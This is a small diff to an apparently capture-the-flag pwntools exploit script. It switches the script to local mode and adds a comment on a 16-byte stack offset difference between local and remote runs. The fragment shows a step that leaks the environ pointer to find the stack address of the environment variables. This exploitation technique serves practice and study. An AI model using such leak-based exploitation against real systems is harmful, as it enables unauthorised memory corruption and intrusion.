@@ -8,7 +8,7 @@ context.arch = "amd64"
 context.os = "linux"
 target_file = "./maps"
 
-LOCAL = False
+LOCAL = True
 
 if LOCAL:
     # p = process(target_file)
@@ -53,6 +53,7 @@ p.send(p64(environ_address))
 address_of_envvars = int(p.recvline().strip(), 16)
 print(f'Address of envvars: {hex(address_of_envvars)}')
 
+# There was a 16 byte difference from my local run and the remote.
 if LOCAL:
     target_address = address_of_envvars - 0x148 + 0x10
 else:
